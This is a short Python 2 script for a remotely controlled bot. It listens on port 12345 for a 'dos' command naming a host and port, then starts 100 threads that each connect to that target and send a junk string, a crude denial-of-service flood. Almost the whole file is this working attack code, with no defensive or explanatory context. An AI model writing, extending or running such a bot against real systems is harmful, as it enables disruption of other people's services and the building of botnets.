#!/usr/bin/env python

import socket
import threading
import os

class Bot:
    def __init__(self):
        self.botServerSocket = socket.socket()
        self.botServerSocket.setsockopt(\
                 socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.botServerSocket.bind(('',12345))
        self.botServerSocket.listen(1)
        connection, addr = self.botServerSocket.accept()
        print addr
        response = connection.recv(255)
        response = response.split(' ')
        if  response[0] == "dos":
            self.attack(response[1],int(response[2]))
    
    def attack(self,host,port):
        for i in range(100):
            t = threading.Thread(target=self.dos,args=(host,port,))
            t.start()
        
    def dos(self,host,port):
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dos.connect((host,port))
        dos.send("pekckpe,kc,e,kc,mmk,")
        dos.close()

port = 12345
bot = Bot()
                
